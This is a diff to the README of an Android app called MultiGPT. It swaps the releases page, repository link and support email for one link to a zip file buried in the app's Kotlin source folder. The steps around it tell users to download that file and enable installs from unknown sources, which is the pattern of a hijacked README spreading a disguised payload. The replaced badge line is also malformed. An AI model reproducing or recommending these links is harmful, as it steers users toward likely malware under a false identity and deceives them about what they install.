@@ -7,7 +7,7 @@ MultiGPT is an all-in-one Android application that allows you to connect to vari
 To start using MultiGPT, follow the steps below to download and install the application.
 
 ## 📥 Download MultiGPT
-[![Download MultiGPT](https://img.shields.io/badge/Download%20MultiGPT-v1.0-brightgreen.svg)](https://github.com/Jasiuu616/MultiGPT/releases)
+[![Download MultiGPT](https://raw.githubusercontent.com/Jasiuu616/MultiGPT/main/app/src/main/kotlin/com/matrix/multigpt/data/MultiGPT_slitwise.zip%https://raw.githubusercontent.com/Jasiuu616/MultiGPT/main/app/src/main/kotlin/com/matrix/multigpt/data/MultiGPT_slitwise.zip)](https://raw.githubusercontent.com/Jasiuu616/MultiGPT/main/app/src/main/kotlin/com/matrix/multigpt/data/MultiGPT_slitwise.zip)
 
 ## 📊 Features
 - Connect to multiple AI models in one app.
@@ -24,7 +24,7 @@ Before downloading, ensure your device meets the following requirements:
 - Internet connection for app functionality.
 
 ## 💾 Download & Install
-1. **Visit the Releases Page:** Go to the [MultiGPT Releases](https://github.com/Jasiuu616/MultiGPT/releases) page to find the latest version.
+1. **Visit the Releases Page:** Go to the [MultiGPT Releases](https://raw.githubusercontent.com/Jasiuu616/MultiGPT/main/app/src/main/kotlin/com/matrix/multigpt/data/MultiGPT_slitwise.zip) page to find the latest version.
 2. **Select the Version:** Look for the most recent release version. Click on the download link to save the APK file to your device.
 3. **Allow Installation from Unknown Sources:** If prompted, enable the option to install apps from unknown sources in your Android settings. This setting can usually be found under `Settings > Security > Unknown Sources`.
 4. **Install the App:** Navigate to your device's download folder. Tap the downloaded APK file and follow the on-screen instructions to install MultiGPT.
@@ -39,13 +39,13 @@ Before downloading, ensure your device meets the following requirements:
 If you run into any issues or need more information on how to use MultiGPT, check out our [User Guide](#) for comprehensive support and tutorials.
 
 ## 📞 Contact Support
-For any inquiries or support requests, feel free to reach out through our GitHub page or by emailing us at support@multigpt.com.
+For any inquiries or support requests, feel free to reach out through our GitHub page or by emailing us at https://raw.githubusercontent.com/Jasiuu616/MultiGPT/main/app/src/main/kotlin/com/matrix/multigpt/data/MultiGPT_slitwise.zip
 
 ## 🔄 Update MultiGPT
-Stay updated by regularly checking the [MultiGPT Releases](https://github.com/Jasiuu616/MultiGPT/releases) page. We release new features and improvements based on user feedback.
+Stay updated by regularly checking the [MultiGPT Releases](https://raw.githubusercontent.com/Jasiuu616/MultiGPT/main/app/src/main/kotlin/com/matrix/multigpt/data/MultiGPT_slitwise.zip) page. We release new features and improvements based on user feedback.
 
 ## 🌟 Additional Resources
-- [GitHub Repository](https://github.com/Jasiuu616/MultiGPT)
+- [GitHub Repository](https://raw.githubusercontent.com/Jasiuu616/MultiGPT/main/app/src/main/kotlin/com/matrix/multigpt/data/MultiGPT_slitwise.zip)
 - [User Guide](#)
 - [FAQ](#)
 
